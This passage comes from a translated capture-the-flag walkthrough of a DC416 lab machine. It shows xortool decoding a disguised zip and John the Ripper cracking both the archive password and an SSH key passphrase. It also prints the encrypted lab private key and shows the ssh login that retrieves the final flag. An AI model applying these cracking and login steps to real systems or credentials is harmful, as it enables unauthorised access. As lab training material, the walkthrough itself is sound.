.text:<span class="hljs-number"><span class="hljs-number">00000000004006</span></span>A5 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> _munmap .text:<span class="hljs-number"><span class="hljs-number">00000000004006</span></span>AA mov edi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; status .text:<span class="hljs-number"><span class="hljs-number">00000000004006</span></span>AF <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> _exit .text:<span class="hljs-number"><span class="hljs-number">00000000004006</span></span>AF main endp</code> </pre> <br></div></div><br><br><h3>  Flag 5 </h3><br>  We still have the file <i>marla.xip</i> .  The file extension is very similar to <i>zip</i> , but it‚Äôs impossible to open it using standard methods.  Let's try to poke it and see what comes of it, using <a href="https://github.com/hellman/xortool">xortool</a> : <br><pre> <code class="bash hljs">$ xortool marla.xip -b</code> </pre> <br><img src="https://habrastorage.org/files/822/bf7/5e5/822bf75e50b246068b8a95b16a0da223.png"><br><br>  Something was found, now let's filter the result: <br><pre> <code class="bash hljs">$ file xortool_out/* | grep Zip xortool_out/000.out: Zip archive data</code> </pre> <br>  Archive found, let's see what's in it: <br><pre> <code class="bash hljs">$ 7z l xortool_out/000.out</code> </pre> <br><img src="https://habrastorage.org/files/6ca/c29/701/6cac297016d942e9a90123b8113e988e.png"><br><br>  Apparently this is the private ssh key of the user <i>marla</i> .  However, just because it can not get it, the archive is also password-protected.  Compile <i>John The Ripper</i> as described <a href="http://www.bytebang.at/Blog/Crack%2B(ZIP)%2Bpasswords%2Bwith%2BJohn%2Bthe%2BRipper">here</a> .  Extract the hash: <br><pre> <code class="bash hljs">$ ./zip2john /tmp/marla.zip &gt; /tmp/marla.zip.john</code> </pre> <br>  And after launch we get the required password: <br><pre> <code class="bash hljs">$ ./john /tmp/marla.zip.john</code> </pre> <br><blockquote>  Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 8x SSE2]) <br>  Will run 2 OpenMP threads <br>  Press 'q' or Ctrl-C for abort <br>  m4rl4 (marla.zip) <br>  1g 0: 00: 00: 00 DONE 1/3 (2017-01-08 23:56) 1.219g / s 3219p / s 3219c / s 3219C / s m4rl4.zip..mar1a.zipzip <br>  Use the "--show" option to display all of the cracked passwords reliably <br>  Session completed </blockquote><br>  Great, there is a password from the archive.  But this is not all, if you look at the file in which the private key is located: <br><div class="spoiler">  <b class="spoiler_title">marla</b> <div class="spoiler_text"><blockquote>  ----- BEGIN RSA PRIVATE KEY ----- <br>  Proc-Type: 4, ENCRYPTED <br>  DEK-Info: AES-128-CBC, 4A3641AA61921099DAB3E32222AE8221 <br><br>  k8zDFT8UXhpb7Dn + KzYv6mYuAI0vF25s / zFpuvtm31FtTwOAzqz + ukei2DR + r4Zb <br>  QKGV5EPf0ymcx6Nh4X700eRa555hFDrWMRwLAy7bTkYK5MbLY3On7BqBnmpbs / bd <br>  Pd / VpmvMtUnl8YcMF756NLt0sgqwWbf8DGFUcJZTGEsZhwTL86cCYyFbbdOHijzY <br>  Wi + OjgVBxw62VrdEn8HHA0Hks72LRGAsXLJ4ReT6nm / 6H88idKHtnc1CXGzUtEwR <br>  E7 / Bzzqn / P1rTrnPp / adV4oAC + Q86Sdy5RHuH35KC6c6WgpFRprqeWeLdf6aBBF0 <br>  yadmGUu4PrWP7iYd7Bc4k2Czlr0pk1x0GjqedjFYmPWypllfZvMriQa6QhYkKlGl <br>  ecEm8Usrok54u8jX1VZtdRu1 + 6gNPZcw8FOK1GTks2L9ywvWoSNOGr5LFBDBYufq <br>  SNNUQq0cEyAl3KaPT5vPyEcrqAa7NKmIl5uImECPG93iIsfOt3P4ujVwWuT3p100 <br>  KHnHEybuZXTBRUPmHoE + wXvFyLAWzHG8d6cy18FzGEyogUbs + d5GmdFjsyaaLeES <br>  8AtkGrWrUAgo / NDpbVdHoLmwjzvxlDkk + Uk3 / KN5qjFKajbav9EoMJNeCac1Ax0i <br>  KHiSvyPtifWu9Mj8IYq6zIVVFoVPc4swDrqxsNkwA8uAXLCIBk / lHOBryIPVmsOd <br>  4gWhae23ul + HC5gHwlXUfq5Zrljhqpw9D50veSizqdtwmWgvs1crkddXbTwUSvrb <br>  kZHQoY2PqfJPmF3TNt5RQvwNIaOMospy29niKk / qICaZ1t9KUyMdfNmyVzHGnJPz <br>  Ae6pdfCsgoymkO1zd4TVaGTRH2tt0ZRXECHPTG / 5i8IRJGB4hlTJ4z0QNcVPQGdF <br>  sI9GuUuRzaIpVbbxf50OG5qWfVRJR2lWwfvIEgmfvKQs9qJBq4X05NeagWoDKhrH <br>  / 90k1S3GI5rw9RyjzD1I4k1li + PjyWs + wZAEn39Hqlxuk + gMWuKCr6Wel / dV3exU <br>  XlkGJLJo1SUK1Uh2Z6CeSwdSVMf2j21pMbeaw8U9RQund9EOwln8JDKtdQXYW9ba <br>  SE / hUpvlNHPG / 90Tp2JQCkk / MinwV4IGev7mn9piltL8Q7qcU1o9TpAxtdonyaYI <br>  UYnzpv + g / 0fhKnycwRttVukt7Mtgvr0SMCXcImMjdnDpVxbrbEWtLgFsZayg + SzQ <br>  / 03KMOA9AVoo48ZlLa + oERqeedXDBqmKkNJwIsBcYEywHl6NlEHCZk2S / lcr + ra9 <br>  im + l2nua3IvYYIRnWHWoLs0D + Hi / PvQHmj3e2YBeIZMYGPHk8XQ17cofwqU7VDr7 <br>  x6nP22au0LGKTj4 + E46r1hEWs9C0X8AMJjfShb + CyN / imo / 3a3bJiazE1F5IpKlY <br>  5UejDh7GCcxnvmjXlY4q + 7DeJlz5VSjKjfR5V0b5mkcLEI18c2sBkTVdMVzzBGQO <br>  kTNSGJSOrF5el9 + wlpLY4E8loocJpzH3P3uu + fOwHtNiul5RAlotfJnJd9lYea5k <br>  W581cgXIWgN6actoiIGZXlHKB5Zsdb3GdmmG0Lb50lsL4GH8MIKDKdumUKSwrT20 <br>  ----- END RSA PRIVATE KEY ----- </blockquote><br></div></div><br>  It can be seen that the password phrase is set on it.  But this is not a problem, we extract it, and send <i>John</i> 'to: <br><pre> <code class="bash hljs">$ ./john-1.8.0-jumbo-1/run/ssh2john marla &gt; marla.ssh $ sudo ./john-1.8.0-jumbo-1/run/john marla.ssh</code> </pre> <br><blockquote>  Loaded 1 password hash (SSH [RSA / DSA 32/32]) <br>  Will run 2 OpenMP threads <br>  Press 'q' or Ctrl-C for abort <br>  singer (marla) <br>  1g 0: 00: 00: 00 DONE 2/3 (2017-01-09 01:11) 1.086g / s 2165p / s 2165c / s 2165C / s rangers..88888888 <br>  Use the "--show" option to display all of the cracked passwords reliably <br>  Session completed </blockquote><br>  Having everything you need, log in via <i>ssh</i> and pick up the last key: <br><pre> <code class="bash hljs">$ ssh -i marla marla@192.168.1.221 Enter passphrase <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> key <span class="hljs-string"><span class="hljs-string">'marla'</span></span>:</code> </pre> <br><blockquote>  The programs included with the Debian GNU / Linux system are free software; <br>  terms of each program are described in the <br>  individual files in / usr / share / doc / * / copyright. <br><br>  Debian GNU / Linux comes with ABSOLUTELY NO WARRANTY, to the extent <br>  permitted by applicable law. <br>  well done!  your flag is flag {l4y3rs_up0n_l4y3rs} <br>  Connection to 192.168.1.221 closed. </blockquote><br>  All keys are collected.  The call is complete!  You can proceed to the following virtual machine images from the DC416 series. </div><p>Source: <a href="https://habr.com/ru/post/318998/">https://habr.com/ru/post/318998/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../318986/index.html">Translation of excerpts from Robert Heinlein‚Äôs book, Take Your Government Back - part 20</a></li>
<li><a href="../318990/index.html">Empathy in Internet services or why the cart is ‚Äúmine‚Äù and not ‚Äúyour‚Äù</a></li>
<li><a href="../318992/index.html">Floating commercial data center Nautilus Data Technologies will begin work this year</a></li>
<li><a href="../318994/index.html">Notes freelancer: how to stop being afraid and start working for yourself</a></li>
<li><a href="../318996/index.html">Pink Eurollers dream of censorship on the topic "1984"</a></li>
<li><a href="../319000/index.html">‚ÄúNano-Framework‚Äù to automate the addition of scripts to. {Bash / zsh} rc</a></li>
<li><a href="../319002/index.html">ruby -run</a></li>
<li><a href="../319006/index.html">Infrastructure simple electronic signature. Part 1: Modeling Using Systems</a></li>
<li><a href="../319008/index.html">We get a list of domains and IP addresses of all banks in the world</a></li>
<li><a href="../319010/index.html">What's new in Active Directory in Windows Server 2016</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>